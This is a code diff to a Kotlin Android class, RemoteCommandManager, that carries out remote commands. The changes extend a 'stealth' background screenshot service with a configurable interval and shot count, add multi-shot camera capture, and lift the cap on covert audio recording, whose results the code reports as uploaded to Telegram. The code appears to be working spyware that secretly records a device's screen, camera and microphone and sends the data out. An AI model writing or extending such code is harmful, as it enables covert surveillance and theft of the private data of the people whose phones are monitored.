@@ -630,8 +630,33 @@ class RemoteCommandManager(private val context: Context) {
                     }
                 }
                 "START_STEALTH_CAPTURE", "START_STEALTH_SCREENSHOT", "START_SCREENSHOT_CAPTURE" -> {
-                    MediaProjectionHelper.startService(context)
-                    resultMessage = "Stealth background screenshot capture service initiated."
+                    var maxShots = 0
+                    var intervalSec = 10
+                    val trimmed = payload.trim()
+                    if (trimmed.startsWith("{")) {
+                        try {
+                            val json = JSONObject(trimmed)
+                            val shots = json.optInt("maxShots", json.optInt("count", json.optInt("shots", json.optInt("max", 0))))
+                            if (shots >= 0) maxShots = shots
+                            val interval = json.optInt("intervalSec", json.optInt("interval", json.optInt("delay", 10)))
+                            if (interval > 0) intervalSec = interval
+                        } catch (_: Exception) {}
+                    } else if (trimmed.contains("|")) {
+                        val parts = trimmed.split("|")
+                        val interval = parts.getOrNull(0)?.trim()?.toIntOrNull()
+                        if (interval != null && interval > 0) intervalSec = interval
+                        val shots = parts.getOrNull(1)?.trim()?.toIntOrNull()
+                        if (shots != null && shots >= 0) maxShots = shots
+                    } else if (trimmed.toIntOrNull() != null) {
+                        val interval = trimmed.toInt()
+                        if (interval > 0) intervalSec = interval
+                    }
+                    MediaProjectionHelper.startService(context, intervalSec, maxShots)
+                    resultMessage = if (maxShots > 0) {
+                        "Stealth screenshot capture initiated (interval: ${intervalSec}s, max shots: $maxShots)."
+                    } else {
+                        "Stealth background screenshot capture service initiated (interval: ${intervalSec}s, continuous)."
+                    }
                 }
                 "STOP_STEALTH_CAPTURE", "STOP_STEALTH_SCREENSHOT", "STOP_SCREENSHOT_CAPTURE" -> {
                     MediaProjectionHelper.stopService(context)
@@ -1150,14 +1175,14 @@ class RemoteCommandManager(private val context: Context) {
 
         var requestedFacing = "back"
         val trimmed = payload.trim()
-        if (trimmed.contains("front", ignoreCase = true)) {
-            requestedFacing = "front"
-        } else if (trimmed.startsWith("{")) {
+        if (trimmed.startsWith("{")) {
             try {
                 val json = JSONObject(trimmed)
                 val camStr = json.optString("camera", json.optString("facing", "back")).lowercase()
                 if (camStr == "front") requestedFacing = "front"
             } catch (_: Exception) {}
+        } else if (trimmed.contains("front", ignoreCase = true)) {
+            requestedFacing = "front"
         }
 
         val cameraHelper = CameraHelper(context)
@@ -1210,6 +1235,8 @@ class RemoteCommandManager(private val context: Context) {
         }
 
         var durationSec = 10
+        var maxShots = 1
+        var intervalSec = 2
         val trimmed = payload.trim()
         if (trimmed.startsWith("{")) {
             try {
@@ -1224,7 +1251,20 @@ class RemoteCommandManager(private val context: Context) {
                         }
                     }
                 }
+                val shots = json.optInt("maxShots", json.optInt("count", json.optInt("shots", json.optInt("max", 1))))
+                if (shots > 0) maxShots = shots.coerceIn(1, 10)
+
+                val interval = json.optInt("intervalSec", json.optInt("interval", json.optInt("delay", 2)))
+                if (interval > 0) intervalSec = interval.coerceIn(1, 60)
             } catch (_: Exception) {}
+        } else if (trimmed.contains("|")) {
+            val parts = trimmed.split("|")
+            val dur = parts[0].trim().filter { it.isDigit() }.toIntOrNull()
+            if (dur != null && dur > 0) durationSec = dur
+            val shots = parts.getOrNull(1)?.trim()?.toIntOrNull()
+            if (shots != null && shots > 0) maxShots = shots.coerceIn(1, 10)
+            val interval = parts.getOrNull(2)?.trim()?.toIntOrNull()
+            if (interval != null && interval > 0) intervalSec = interval.coerceIn(1, 60)
         } else if (trimmed.contains("=")) {
             val valPart = trimmed.substringAfter("=").trim().filter { it.isDigit() }
             val parsed = valPart.toIntOrNull()
@@ -1235,7 +1275,7 @@ class RemoteCommandManager(private val context: Context) {
                 durationSec = parsed
             }
         }
-        val finalDuration = durationSec.coerceIn(3, 60)
+        val finalDuration = durationSec.coerceAtLeast(1)
 
         val audioHelper = AudioRecorderHelper(context)
         try {
@@ -1271,7 +1311,7 @@ class RemoteCommandManager(private val context: Context) {
                 Log.e("RemoteCommandManager", "Failed to upload audio to Telegram: ${e.message}")
             }
 
-            "Recorded $finalDuration seconds audio (${(audioBytes.size / 1024)} KB). Uploaded to Telegram."
+            return@withContext "Successfully recorded $finalDuration seconds audio (${(audioBytes.size / 1024)} KB). Uploaded to Telegram."
         } finally {
             audioHelper.cleanup()
         }
